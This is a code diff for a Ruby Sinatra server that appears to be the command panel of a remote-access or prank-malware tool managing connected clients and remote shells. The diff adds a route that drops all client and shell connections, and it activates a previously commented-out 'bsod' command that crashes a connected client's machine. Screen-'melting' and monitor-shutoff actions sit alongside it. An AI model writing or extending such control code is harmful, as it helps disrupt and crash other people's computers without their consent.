@@ -86,6 +86,13 @@ class MyServer < Sinatra::Base
     end
   end
 
+  get '/refresh' do
+    $clientsList.each {|k| if !k.nil? then k.close end }
+    $shellList.each { |k| if !k.nil? then k.close end }
+    @js = ["home-js"]
+    erb :home
+  end
+
   get '/show_qr' do
     generate_qr(params)
     @css = ["show_qr-styles"]
@@ -340,7 +347,7 @@ class MyServer < Sinatra::Base
           @msg = "Trying to melt #{@mClient.name}\'s screen. \n
           WARNING: This function has first false positive!"
         when "bsod"
-          #$semaphore.synchronize { @mClient.bsod }
+          $semaphore.synchronize { @mClient.bsod }
           @msg = "Trying... nevermind, #{@mClient.name} is just dead."
         when "turnoffMonitor"
           $semaphore.synchronize { @mClient.turn_off_monitor }
